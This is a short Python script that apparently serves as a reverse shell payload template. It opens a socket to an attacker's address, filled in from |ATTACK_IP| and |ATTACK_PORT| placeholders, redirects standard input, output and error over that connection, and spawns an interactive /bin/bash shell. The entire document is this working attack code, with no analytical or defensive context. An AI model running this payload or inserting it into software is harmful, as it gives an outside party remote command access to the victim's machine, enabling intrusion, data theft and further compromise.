import sys,socket,os,pty

ip="|ATTACK_IP|"
port="|ATTACK_PORT|"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
